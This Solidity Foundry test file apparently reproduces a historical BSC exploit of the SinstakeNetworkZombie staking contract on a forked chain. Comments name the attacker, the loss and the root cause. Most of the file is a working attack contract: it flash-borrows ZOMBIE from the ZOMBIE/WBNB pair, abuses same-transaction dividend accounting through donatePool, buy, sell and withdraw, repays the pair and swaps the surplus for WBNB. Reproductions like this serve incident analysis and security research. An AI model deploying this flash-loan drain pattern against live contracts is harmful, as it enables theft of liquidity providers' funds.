// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 705.13 USD
// Attacker : 0xc49f2938327aa2cdc3f2f89ed17b54b3671f05de
// Attack Contract : 0xd599588b08eb167ee455f4bdac46fe162e7a6515
// Vulnerable Contract : 0x7314729D691fD074DBbA03ca3c6eF3BE61b31D34
// Attack Tx : https://bscscan.com/tx/0x8b8e655c0ab0cd400e23e6d6a935aa23226a8a060bb37f40663f2d81ee63b94f
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7314729D691fD074DBbA03ca3c6eF3BE61b31D34#code
//
// @Analysis
// Telegram Alert : https://t.me/defimon_alerts/1319
//
// Attack summary: the attacker flash-borrowed ZOMBIE from the ZOMBIE/WBNB BSCswap pair, used the
// SinstakeNetworkZombie donate/buy/sell/withdraw accounting path to pull more ZOMBIE from the
// contract than the flash-borrowed principal, then sold the excess ZOMBIE through the same pair for WBNB.
// Root cause: donation-funded dividends are immediately claimable by a same-transaction buyer/seller,
// so a temporary ZOMBIE balance can mint pool shares, realize the dividend balance, and leave enough
// surplus ZOMBIE to drain WBNB liquidity after satisfying the pair invariant.

address constant ATTACKER = address(uint160(0x00c49f2938327aa2cdc3f2f89ed17b54b3671f05de));
address constant HISTORICAL_ATTACK_CONTRACT = address(uint160(0x00d599588b08eb167ee455f4bdac46fe162e7a6515));
address constant HISTORICAL_FLASH_HELPER = address(uint160(0x005bd5cce0e913d1bb17b8019987c1e4af7f746f45));
address constant ZOMBIE_WBNB_PAIR = address(uint160(0x00aa4de99529ce0dc3ff2d2da3e73ab001ad068dc6));
address constant SINSTAKE_ZOMBIE = address(uint160(0x007314729d691fd074dbba03ca3c6ef3be61b31d34));
address constant ZOMBIE_TOKEN = address(uint160(0x00e2a6428fd332287b0470965e16350d3cc1736e3e));
address constant WBNB_TOKEN = address(uint160(0x00bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c));

uint256 constant FLASH_ZOMBIE_AMOUNT = 0x18d446cd6800;
uint256 constant DONATE_AMOUNT = 0x9184e72a000;
uint256 constant BUY_AMOUNT = 0xdea4f10a800;
uint256 constant CALLBACK_PAIR_INPUT = 0x1a383a622000;
uint256 constant WBNB_OUT = 0x0f49e4d1e914e349;

interface IBSCswapPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IBSCswapCallee {
    function BSCswapCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface ISinstakeNetworkZombie {
    function donatePool(
        uint256 amount
    ) external returns (uint256);
    function buy(
        uint256 buyAmount
    ) external returns (uint256);
    function myTokens() external view returns (uint256);
    function sell(
        uint256 amountOfTokens
    ) external;
    function withdraw() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 51_737_496;
        vm.createSelectFork("bsc", forkBlock);
        vm.roll(51_737_497);
        vm.warp(1_750_350_413);

        fundingToken = WBNB_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
        vm.label(HISTORICAL_FLASH_HELPER, "Historical flash helper");
        vm.label(ZOMBIE_WBNB_PAIR, "ZOMBIE/WBNB BSCswap pair");
        vm.label(SINSTAKE_ZOMBIE, "SinstakeNetworkZombie");
        vm.label(ZOMBIE_TOKEN, "ZOMBIE");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        assertEq(IBSCswapPair(ZOMBIE_WBNB_PAIR).token0(), WBNB_TOKEN);
        assertEq(IBSCswapPair(ZOMBIE_WBNB_PAIR).token1(), ZOMBIE_TOKEN);

        uint256 attackerWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ATTACKER);
        uint256 pairWbnbBefore = IERC20(WBNB_TOKEN).balanceOf(ZOMBIE_WBNB_PAIR);

        SinstakeZombieAttack attack = new SinstakeZombieAttack(ATTACKER);
        attack.execute();

        uint256 attackerProfit = IERC20(WBNB_TOKEN).balanceOf(ATTACKER) - attackerWbnbBefore;
        assertEq(attackerProfit, WBNB_OUT);
        assertEq(pairWbnbBefore - IERC20(WBNB_TOKEN).balanceOf(ZOMBIE_WBNB_PAIR), WBNB_OUT);
    }
}

contract SinstakeZombieAttack is IBSCswapCallee {
    address private immutable profitReceiver;

    constructor(
        address receiver
    ) {
        profitReceiver = receiver;
    }

    function execute() external {
        // step 1: borrow ZOMBIE from the live pair through its BSCswap callback.
        IBSCswapPair(ZOMBIE_WBNB_PAIR).swap(0, FLASH_ZOMBIE_AMOUNT, address(this), abi.encode(uint256(1)));

        // step 5: after the first swap accepts its input, send all remaining ZOMBIE to the pair and
        // swap the resulting reserve imbalance into WBNB for the historical attacker.
        IERC20(ZOMBIE_TOKEN).transfer(ZOMBIE_WBNB_PAIR, IERC20(ZOMBIE_TOKEN).balanceOf(address(this)));
        IBSCswapPair(ZOMBIE_WBNB_PAIR).getReserves();
        IBSCswapPair(ZOMBIE_WBNB_PAIR).swap(WBNB_OUT, 0, profitReceiver, new bytes(0));
    }

    function BSCswapCall(address, uint256 amount0, uint256 amount1, bytes calldata) external override {
        require(msg.sender == ZOMBIE_WBNB_PAIR, "unexpected pair");
        require(amount0 == 0 && amount1 == FLASH_ZOMBIE_AMOUNT, "unexpected flash amount");

        // step 2: use the borrowed ZOMBIE as temporary capital for SinstakeNetworkZombie.
        IERC20(ZOMBIE_TOKEN).approve(SINSTAKE_ZOMBIE, FLASH_ZOMBIE_AMOUNT);
        ISinstakeNetworkZombie(SINSTAKE_ZOMBIE).donatePool(DONATE_AMOUNT);
        ISinstakeNetworkZombie(SINSTAKE_ZOMBIE).buy(BUY_AMOUNT);

        // step 3: burn the freshly minted pool balance, then withdraw the dividend-funded ZOMBIE.
        uint256 mintedPoolTokens = ISinstakeNetworkZombie(SINSTAKE_ZOMBIE).myTokens();
        ISinstakeNetworkZombie(SINSTAKE_ZOMBIE).sell(mintedPoolTokens);
        ISinstakeNetworkZombie(SINSTAKE_ZOMBIE).withdraw();

        // step 4: satisfy the flash swap invariant while retaining the excess ZOMBIE for the follow-up swap.
        IERC20(ZOMBIE_TOKEN).transfer(ZOMBIE_WBNB_PAIR, CALLBACK_PAIR_INPUT);
    }
}
